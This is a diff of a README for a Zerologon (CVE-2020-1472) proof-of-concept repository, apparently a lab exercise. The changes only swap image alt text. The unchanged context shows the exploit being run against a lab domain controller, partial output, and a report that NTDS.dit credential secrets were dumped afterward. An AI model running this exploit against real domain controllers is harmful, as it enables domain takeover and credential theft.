@@ -1,6 +1,6 @@
 # CVE-2020-1472 - Zero-Logon POC
 <p align='center'>
-  <img src='PoC - CVE-2020-1472.png' alt="huyqa-home.com">
+  <img src='PoC - CVE-2020-1472.png' alt="HTB">
 </p>
 ![alt text](https://github.com/harshil-shah004/zerologon-CVE-2020-1472/blob/master/PoC%20-%20CVE-2020-1472.png)
 
@@ -25,17 +25,19 @@ Requires Python 3.7 or higher and Pip. Install dependencies as follows:
     pip install -r requirements.txt
 
 <p align='center'>
-  <img src='./Screenshots/install-req.png' alt="huyqa-home.com">
+  <img src='./Screenshots/install-req.png' alt="HTB">
 </p>
     
 ## Before Zerologon 
 
 <p align='center'>
-  <img src='./Screenshots/before-zerologon.png alt="huyqa-home.com">
+  <img src='./Screenshots/before-zerologon.png alt="HTB">
 </p>
+
 Unable to dump secrets!
 
 ## Performing Zerologon Attack!
+
     huyqa@bananoname-pc:~/Music/zerologon-CVE-2020-1472$ python3 zero-logon-exploit.py AD-SRV 192.168.56.129
     Performing authentication attempts...
     ==================================================================================================================
@@ -47,7 +49,7 @@ Unable to dump secrets!
 
 
 <p align='center'>
-  <img src='./Screenshots/Screenshot from 2023-12-28 15-35-49.png' alt="huyqa-home.com">
+  <img src='./Screenshots/Screenshot from 2023-12-28 15-35-49.png' alt="HTB">
 </p>
 
 ## After Zerologon
@@ -71,7 +73,7 @@ Unable to dump secrets!
     [*] Cleaning up... 
 
 <p align='center'>
-  <img src='./Screenshots/after-zerologon1.png' alt="huyqa-home.com">
+  <img src='./Screenshots/after-zerologon1.png' alt="HTB">
 </p>
 Successfully dumped NTDS.dit secrets!
 
